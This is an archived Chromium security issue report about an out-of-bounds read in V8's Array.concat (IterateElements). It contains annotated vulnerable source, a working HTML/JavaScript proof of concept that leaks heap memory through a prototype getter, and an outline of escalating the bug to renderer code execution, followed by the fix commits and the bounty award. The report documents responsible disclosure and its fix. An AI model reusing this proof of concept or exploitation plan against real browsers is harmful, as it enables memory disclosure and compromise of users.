# Security: v8 Array.concat OOB access writeup 

| Field | Value |
|-------|-------|
| **Issue ID** | [40083848](https://issues.chromium.org/issues/40083848) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Reporter** | li...@gmail.com |
| **Assignee** | cb...@chromium.org |
| **Created** | 2016-03-14 |
| **Bounty** | $7,500.00 |

## Description


I. Vulnerability

p.s. The line numbers I mentioned below are referred to this version of v8 (https://chromium.googlesource.com/v8/v8.git/+/163a909154febf5498ee60efe0f4aab09be21515/)

The vulnerability lies in function IterateElements (src/builtin.cc:997). The function is to iteratively visit elements of an array.

Let us take the visiting on an array containing fast/fast smi elements as an example:

From line 1025 in src/builtin.cc (function IterateElements):
  switch (array->GetElementsKind()) {
    case FAST_SMI_ELEMENTS:
    case FAST_ELEMENTS:
    case FAST_HOLEY_SMI_ELEMENTS:
    case FAST_HOLEY_ELEMENTS: {
      // Run through the elements FixedArray and use HasElement and GetElement
      // to check the prototype for missing elements.
      Handle<FixedArray> elements(FixedArray::cast(array->elements()));
      int fast_length = static_cast<int>(length);  <-- fast_length keeps its value after entering the iteration below
      DCHECK(fast_length <= elements->length());
      for (int j = 0; j < fast_length; j++) {
        HandleScope loop_scope(isolate);
        Handle<Object> element_value(elements->get(j), isolate); <-- get the element with index j (leading to oob access)
        if (!element_value->IsTheHole()) {
          visitor->visit(j, element_value);
        } else {  <-- if it is a hole, it may go to its prototype for the value with index j
          Maybe<bool> maybe = JSReceiver::HasElement(array, j);
          if (!maybe.IsJust()) return false;
          if (maybe.FromJust()) {
            // Call GetElement on array, not its prototype, or getters won't
            // have the correct receiver.
            ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                isolate, element_value, Object::GetElement(isolate, array, j),
                false);   <-- here we redefine the function to get the value in array's __proto__ with index j
                          <-- inside our redefinition function we make the length of the array shorter (< fast_length)
            visitor->visit(j, element_value);
          }
        }
      }
      break;
    }

We can see that the for loop iterates for fast_length times which is determined before entering the loop. However, if we keep a hole inside the array at index j and define the function to get the value in the array's __proto__ with index j, we have a chance to shorten the array in the middle of the loop (and force v8 to re-organize the v8 heap). After that, the loop keeps going on and elements->get(j) may lead to an OOB access. Note that in Chrome release version, elements->get(j) has no bound checking as follows.

src/objects-inl.h:2362
Object* FixedArray::get(int index) const {
  SLOW_DCHECK(index >= 0 && index < this->length()); <-- release version does nothing here ;)
  return READ_FIELD(this, kHeaderSize + index * kPointerSize);
}

Similarly, the same issue also lies in another switch case, visiting on an array containing fast double elements.

II. PoC

The function IterateElements is used in Array.concat() which can be called in javascript to trigger the vulnerability. A simple poc demonstrates an oob access as follows:

<html>
<script language="javascript">
function gc() {
  tmp = [];
  for (var i = 0; i < 0x100000; i++)
    tmp.push(new Uint8Array(10));
  tmp = null;
}

b = new Array(10);
b[0] = 0.1; <-- Note that b[1] is a hole!
b[2] = 2.1;
b[3] = 3.1;
b[4] = 4.1;
b[5] = 5.1;
b[6] = 6.1;
b[7] = 7.1;
b[8] = 8.1;
b[9] = 9.1;
b[10] = 10.1;

Object.defineProperty(b.__proto__, 1, { <-- define b.__proto__[1] to gain the control in the middle of the loop
	get: function () {
		b.length = 1; <-- shorten the array
		gc(); <-- shrink the memory
		return 1;
	},
	set: function(new_value){
        /* some business logic goes here */
        value = new_value
    }
});

c = b.concat();
for (var i = 0; i < c.length; i++)
{
    document.write(c[i]);
    document.write("<br>");
}
</script>
</html>

my result (it differs):
0.1
1
3.60739284464e-313
2.121995791e-314
0
8.487983164e-314
2.121995791e-314
2.121995791e-314
2.121995791e-314
1.9338903543223e-311
2.610054822887e-312

We get the leaked information on the v8 heap which does not originally belong to that fast double elem array. ;)

III. Conclusion

We can rely on this single vulnerability to achieve arbitrary code execution in the renderer process (even on x64). The main idea is that 1) Trigger the vulnerability on a fast double elem array, and craft memory layout to make heap addresses lie just after the victim array elements. These heap addresses will be oob accessed later as doubles and thus we got an info leak. 2) Trigger the vulnerability on a fast elem array, and craft memory layout to make controlled addresses lie just after the victim array elements. These crafted addresses will be oob accessed later and considered as v8 object addresses. We can control the data content pointed by these crafted addresses and thus own some ArrayBuffer objects (my choice) fully under our control. After that, arbitrary read/write is easily achieved and the code execution is then straightforward.

Refer to the exploit for details. (When an alert pops up, attach the windbg onto the renderer process and continue the execution, the process will trap into a break instruction int3 set by me).

Environment:
Chrome Stable Version 49.0.2623.87 (64-bit)
Windows 10 Version 1511 (10586.164)

Credit: Wen Xu, Tencent KeenLab
hotdog3645@gmail.com



## Attachments

- [poc.html](attachments/poc.html) (text/plain, 5.2 KB)

## Timeline

### ti...@google.com (2016-03-14)

[Empty comment from Monorail migration]

### wf...@chromium.org (2016-03-14)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### cl...@chromium.org (2016-03-14)

[Comment Deleted]

### ha...@chromium.org (2016-03-14)

Suspecting this is related to cbdb13533ee6c5fdd2ed5df41e70892cb25e5f57 / https://codereview.chromium.org/1330483003. 

### ha...@chromium.org (2016-03-14)

[Empty comment from Monorail migration]

### wf...@chromium.org (2016-03-14)

[Empty comment from Monorail migration]

### wf...@chromium.org (2016-03-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-14)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=4628021874524160

### cb...@chromium.org (2016-03-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-03-15)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-03-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/96a2bd8ae8c25e2acbe63319011cbb829b59e3df

commit 96a2bd8ae8c25e2acbe63319011cbb829b59e3df
Author: cbruni <cbruni@chromium.org>
Date: Tue Mar 15 20:28:15 2016

[builtins] Fix Array.prototype.concat bug

Array.prototype.concat did not work correct with complex elements on the
receiver or the prototype chain.

BUG=chromium:594574
LOG=y

Review URL: https://codereview.chromium.org/1804963002

Cr-Commit-Position: refs/heads/master@{#34798}

[modify] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/src/builtins.cc
[modify] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/src/elements.cc
[modify] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/src/elements.h
[modify] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/test/mjsunit/array-concat.js
[modify] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/test/mjsunit/es6/array-concat.js
[add] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/test/mjsunit/regress/regress-crbug-594574-concat-leak-1.js
[add] https://crrev.com/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/test/mjsunit/regress/regress-crbug-594574-concat-leak-2.js


### wf...@chromium.org (2016-03-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2016-03-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2016-03-17)

Crbuni@, can you please merge to stable and beta branches.

### cl...@chromium.org (2016-03-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2016-03-17)

Please merge after a day of baking on canary, as per your usual processes.

### ti...@google.com (2016-03-17)

[Empty comment from Monorail migration]

### wf...@chromium.org (2016-03-20)

ping on the v8 merge to M49/M50

### cb...@chromium.org (2016-03-21)

[Empty comment from Monorail migration]

### ti...@google.com (2016-03-21)

Your change meets the bar and is auto-approved for M50 (branch: 2661)

### bu...@chromium.org (2016-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/aa3be3bf89f67feac2f51c5fe9763c645454d445

commit aa3be3bf89f67feac2f51c5fe9763c645454d445
Author: Camillo Bruni <cbruni@chromium.org>
Date: Mon Mar 21 16:44:23 2016

Version 4.9.385.31 (cherry-pick)

Merged 96a2bd8ae8c25e2acbe63319011cbb829b59e3df

[builtins] Fix Array.prototype.concat bug

BUG=chromium:594574
LOG=N
R=jkummerow@chromium.org, hablich@chromium.org

Review URL: https://codereview.chromium.org/1820963002 .

Cr-Commit-Position: refs/branch-heads/4.9@{#37}
Cr-Branched-From: 2fea296569597e5064f81fd8fce58f1848de261a-refs/heads/4.9.385@{#1}
Cr-Branched-From: 0c1430ac2b65847559d6a09f883ee7e5a91063c9-refs/heads/master@{#33306}

[modify] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/include/v8-version.h
[modify] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/src/builtins.cc
[modify] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/src/elements.cc
[modify] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/src/elements.h
[modify] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/test/mjsunit/array-concat.js
[add] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/test/mjsunit/regress/regress-crbug-594574-concat-leak-1.js
[add] https://crrev.com/aa3be3bf89f67feac2f51c5fe9763c645454d445/test/mjsunit/regress/regress-crbug-594574-concat-leak-2.js


### ha...@chromium.org (2016-03-22)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-03-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/5424175c3ad321173f6046e29f4fe3be46613415

commit 5424175c3ad321173f6046e29f4fe3be46613415
Author: Camillo Bruni <cbruni@chromium.org>
Date: Tue Mar 22 10:01:59 2016

Version 5.0.71.22 (cherry-pick)

Merged 96a2bd8ae8c25e2acbe63319011cbb829b59e3df

[builtins] Fix Array.prototype.concat bug

BUG=chromium:594574
LOG=N
R=jkummerow@chromium.org

Review URL: https://codereview.chromium.org/1818933003 .

Cr-Commit-Position: refs/branch-heads/5.0@{#29}
Cr-Branched-From: ad16e6c2cbd2c6b0f2e8ff944ac245561c682ac2-refs/heads/5.0.71@{#1}
Cr-Branched-From: bd9df50d75125ee2ad37b3d92c8f50f0a8b5f030-refs/heads/master@{#34215}

[modify] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/include/v8-version.h
[modify] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/src/builtins.cc
[modify] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/src/elements.cc
[modify] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/src/elements.h
[modify] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/test/mjsunit/array-concat.js
[modify] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/test/mjsunit/es6/array-concat.js
[add] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/test/mjsunit/regress/regress-crbug-594574-concat-leak-1.js
[add] https://crrev.com/5424175c3ad321173f6046e29f4fe3be46613415/test/mjsunit/regress/regress-crbug-594574-concat-leak-2.js


### ti...@google.com (2016-03-23)

[Empty comment from Monorail migration]

### ti...@google.com (2016-03-24)

Congrats - $7500 for the report. We'll mention this in our release notes tomorrow and we'll get in contact for payment.

### ti...@google.com (2016-03-24)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-04-05)

[Empty comment from Monorail migration]

### wf...@chromium.org (2016-04-12)

[Empty comment from Monorail migration]

### ti...@google.com (2016-04-18)

[Empty comment from Monorail migration]

### ti...@google.com (2016-04-22)

Payment info sent to hotdog3645@gmail.com (as mentioned in the OP)

### sh...@chromium.org (2016-06-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### da...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### la...@chromium.org (2021-02-25)

[Empty comment from Monorail migration]

### is...@google.com (2021-02-25)

This issue was migrated from crbug.com/chromium/594574?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/595485]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083848)*
